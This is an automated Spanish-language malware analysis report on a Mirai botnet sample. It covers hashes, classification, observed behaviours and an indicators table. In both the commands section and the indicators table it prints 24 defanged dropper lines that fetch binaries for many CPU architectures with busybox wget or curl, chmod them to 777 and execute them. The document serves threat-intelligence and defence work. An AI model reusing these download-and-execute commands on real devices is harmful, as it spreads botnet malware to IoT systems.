# 🧬 Payload Analysis

`f9ff734b37268043687f5124189165ae5b58026e82ce381cadac08669b82d56b`

## 📌 Resumen

Artefacto asociado a la familia **mirai** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución. Se identificaron 24 comandos observados o extraídos. Se identificaron 37 indicadores técnicos. **Perfil técnico:** `Linux embebido / IoT` (probable). La presencia de BusyBox, junto con la evidencia de familia Mirai, es consistente con malware orientado a sistemas embebidos e IoT. **Ficha malware:** [malware-like/oraculo/botnet/f9ff734b37268043687f5124189165ae5b58026e82ce381cadac08669b82d56b.md](../../../../../malware-like/oraculo/botnet/f9ff734b37268043687f5124189165ae5b58026e82ce381cadac08669b82d56b.md)


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:47:28.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `f9ff734b37268043687f5124189165ae5b58026e82ce381cadac08669b82d56b`
- **SHA1:** `21d5b0aaa23e30512ff164532299add874959fb1`
- **MD5:** `befa03966ba7eeaaeb4d40257ff5fdff`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.03 |
| Strings | 47 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=10

## 🖥️ Comandos observados / extraídos

```text
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRR
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRii
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRii
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRii
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRii
busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MM
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRiiOisecTan
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRRiiOisecT
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRRiiOisecT
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRRiiOisecT
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRRiiOisecT
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRRiiOisecT
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRRiiOisecT
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRiiOisecTan
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRiiOisecTan
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRiiOisecTan
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRiiOisecTan
curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MMaaRRiiOi
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; | strings |
| url | hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; | strings |
| ip | 94.154.43.XXX | static_analysis |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRii | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRR | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRii | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRii | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRii | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRii | strings |
| command | busybox wget hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MM | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm; chmod 777 MMaaRRiiOisecTanee.arm; ./MMaaRRiiOisecTan | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm5; chmod 777 MMaaRRiiOisecTanee.arm5; ./MMaaRRiiOisecT | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm6; chmod 777 MMaaRRiiOisecTanee.arm6; ./MMaaRRiiOisecT | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.arm7; chmod 777 MMaaRRiiOisecTanee.arm7; ./MMaaRRiiOisecT | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.m68k; chmod 777 MMaaRRiiOisecTanee.m68k; ./MMaaRRiiOisecT | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mips; chmod 777 MMaaRRiiOisecTanee.mips; ./MMaaRRiiOisecT | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.mpsl; chmod 777 MMaaRRiiOisecTanee.mpsl; ./MMaaRRiiOisecT | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.ppc; chmod 777 MMaaRRiiOisecTanee.ppc; ./MMaaRRiiOisecTan | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.sh4; chmod 777 MMaaRRiiOisecTanee.sh4; ./MMaaRRiiOisecTan | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.spc; chmod 777 MMaaRRiiOisecTanee.spc; ./MMaaRRiiOisecTan | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86; chmod 777 MMaaRRiiOisecTanee.x86; ./MMaaRRiiOisecTan | strings |
| command | curl hxxp://94.154.43.XXX/MMaaRRiiOisecTanee/MMaaRRiiOisecTanee.x86_64; chmod 777 MMaaRRiiOisecTanee.x86_64; ./MMaaRRiiOi | strings |
| hash | f9ff734b37268043687f5124189165ae5b58026e82ce381cadac08669b82d56b | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | html response |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
